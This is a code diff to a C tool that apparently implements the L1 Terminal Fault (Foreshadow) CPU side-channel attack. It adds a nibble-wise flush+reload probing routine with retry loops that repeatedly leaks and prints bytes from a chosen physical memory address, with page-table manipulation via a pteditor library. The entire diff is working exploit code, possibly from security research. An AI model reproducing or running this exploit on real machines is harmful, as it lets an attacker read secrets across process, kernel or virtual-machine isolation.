@@ -1,7 +1,8 @@
+#include "statistics.h"
 #define _GNU_SOURCE
-#include "l1tf.h"
 #include "constants.h"
 #include "flush_and_reload.h"
+#include "l1tf.h"
 #include <asm-generic/errno-base.h>
 #include <bits/types/siginfo_t.h>
 #include <err.h>
@@ -27,13 +28,19 @@
 #define THRESHOLD 150
 
 uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer) {
-  flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0]);
-  asm_l1tf_leak_high_nibble(leak_addr, reload_buffer);
-  size_t high = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0], THRESHOLD);
+  ssize_t high, low;
 
-  flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[1]);
-  asm_l1tf_leak_low_nibble(leak_addr, reload_buffer);
-  size_t low = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[1], THRESHOLD);
+  do {
+    flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0]);
+    asm_l1tf_leak_high_nibble(leak_addr, reload_buffer);
+    high = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0], THRESHOLD);
+  } while (high == -1);
+
+  do {
+    flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0]);
+    asm_l1tf_leak_low_nibble(leak_addr, &reload_buffer[0]);
+    low = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0], THRESHOLD);
+  } while (low == -1);
 
   return ((high & 0x0f) << 4) | (low & 0x0f);
 }
@@ -370,14 +377,45 @@ void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size, char 
   return NULL;
 }
 
-void l1tf_do_leak_bitwise(const uintptr_t phys_addr, const size_t length) {
+size_t l1tf_do_leak_nibblewise_prober(void *leak_addr, reload_buffer_t *reload_buffer,
+                                      void (*l1tf_leak_function)(void *, reload_buffer_t)) {
+  const size_t nr_of_probes = 1000;
+  const size_t probe_size = AMOUNT_OF_OPTIONS_IN_NIBBLE * sizeof(size_t);
+  size_t *probes = malloc(probe_size);
+  memset(probes, 0, probe_size);
+
+  for (size_t probe_nr = 0; probe_nr < nr_of_probes; ++probe_nr) {
+    ssize_t nibble = -1;
+    size_t attempt = 0;
+    do {
+      flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0]);
+      l1tf_leak_function(leak_addr, reload_buffer[0]);
+      nibble = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0], THRESHOLD);
+      attempt += 1;
+    } while (nibble == -1 && attempt < 100);
+
+    if (nibble != -1) {
+      probes[nibble] += 1;
+    }
+  }
+
+  size_t max = maximum(AMOUNT_OF_OPTIONS_IN_NIBBLE - 1, &probes[1]) + 1;
+  if (probes[max] == 0) {
+    max = 0;
+  }
+
+  free(probes);
+
+  return max;
+}
+
+void l1tf_do_leak_nibblewise(const uintptr_t phys_addr, const size_t length) {
   initialize_pteditor_lib();
 
   fprintf(stderr, "Attempting to leak %ld bytes from %p...\n", length, (void *)phys_addr);
   fprintf(stderr, "Request leak and reload buffers\n");
 
-  bit_reload_buffer *reload_buffer = mmap(NULL, 2 * sizeof(bit_reload_buffer), PROT_WRITE | PROT_READ,
-                                          MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
+  reload_buffer_t *reload_buffer = l1tf_reload_buffer_create();
 
   leak_addr_t leak = l1tf_leak_buffer_create();
   l1tf_leak_buffer_modify(&leak, (void *)phys_addr);
@@ -396,6 +434,31 @@ void l1tf_do_leak_bitwise(const uintptr_t phys_addr, const size_t length) {
   printf("Continously leaking %ld bytes from physcial address 0x%lx:\n", length, phys_addr);
   size_t start = (phys_addr & 0xfff);
   assert(start + length < 0xfff);
+
+  while (true) {
+    for (size_t i = 0, j = start; j < start + length; j += 1) {
+      void *leak_addr = (char *)leak.leak + j;
+      size_t high = l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_high_nibble);
+      size_t low = l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_low_nibble);
+      size_t result = ((high & 0x0f) << 4) | (low & 0x0f);
+      results[i++] = result;
+    }
+
+    printf("Leaked from %p: ", (void *)phys_addr);
+    for (size_t i = 0; i < length; ++i) {
+      printf("%02x ", results[i]);
+    }
+    printf("\n");
+  }
+
+  free(results);
+
+  l1tf_leak_buffer_free(&leak);
+  l1tf_reload_buffer_free(reload_buffer);
+  free_mds_offenders(mds_offenders);
+
+  ptedit_cleanup();
+
   //
   // printf("hellO!");
 }
@@ -617,7 +680,7 @@ int l1tf_main(int argc, char *argv[argc]) {
     if (!strcmp("leak", argv[1])) {
       return l1tf_main_leak(argc, argv, l1tf_do_leak);
     } else if (!strcmp("leak_bitwise", argv[1])) {
-      return l1tf_main_leak(argc, argv, l1tf_do_leak_bitwise);
+      return l1tf_main_leak(argc, argv, l1tf_do_leak_nibblewise);
     } else if (!strcmp("scan", argv[1])) {
       return l1tf_main_scan(argc, argv);
     }
@@ -627,7 +690,7 @@ int l1tf_main(int argc, char *argv[argc]) {
   fprintf(stderr,
           "Usage\n"
           "\t%s leak\n"
-          "\t%s leak_bitwise\n"
+          "\t%s leak_nibblewise\n"
           "\t%s scan\n",
           name, name, name);
   exit(1);
